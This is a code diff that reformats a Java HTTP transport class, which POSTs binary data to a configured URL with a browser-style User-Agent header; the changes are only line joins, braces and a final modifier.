@@ -102,21 +102,19 @@ public abstract class HttpTransport extends Transport {
 	 *             the transport exception
 	 */
 	@Override
-	public synchronized byte[] command(final byte[] data)
-			throws TransportException {
+	public synchronized byte[] command(final byte[] data) throws TransportException {
 
 		// sending request
 		final DefaultHttpClient httpclient = new DefaultHttpClient();
 
-		HttpParams httpParameters = new BasicHttpParams();
+		final HttpParams httpParameters = new BasicHttpParams();
 		// HttpConnectionParams.setConnectionTimeout(httpParameters,
 		// CONNECTION_TIMEOUT);
 		// HttpConnectionParams.setSoTimeout(httpParameters, SO_TIMEOUT);
 		// httpclient.setParams(httpParameters);
 
 		httpclient.setKeepAliveStrategy(new ConnectionKeepAliveStrategy() {
-			public long getKeepAliveDuration(HttpResponse response,
-					org.apache.http.protocol.HttpContext context) {
+			public long getKeepAliveDuration(HttpResponse response, org.apache.http.protocol.HttpContext context) {
 				return 5000;
 			}
 		});
@@ -124,8 +122,7 @@ public abstract class HttpTransport extends Transport {
 		// CookiePolicy.RFC_2965);
 
 		final HttpPost httppost = new HttpPost(baseurl);
-		httppost.setHeader(
-				"User-Agent",
+		httppost.setHeader("User-Agent",
 				"Mozilla/5.0 (Linux; U; Android 0.5; en-us) AppleWebKit/522+ (KHTML, like Gecko) Safari/419.3");
 		httppost.setHeader("Content-Type", "application/octet-stream");
 
@@ -161,14 +158,18 @@ public abstract class HttpTransport extends Transport {
 				return null;
 			}
 		} catch (final Exception ex) {
-			if(Cfg.DEBUG) Check.log( TAG + " Error: " + ex.toString());
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " Error: " + ex.toString());
+			}
 			throw new TransportException(1);
 		} finally {
 			if (in != null) {
 				try {
 					in.close();
 				} catch (final IOException e) {
-					if(Cfg.DEBUG) { Check.log(e); }
+					if (Cfg.DEBUG) {
+						Check.log(e);
+					}
 				}
 			}
 		}
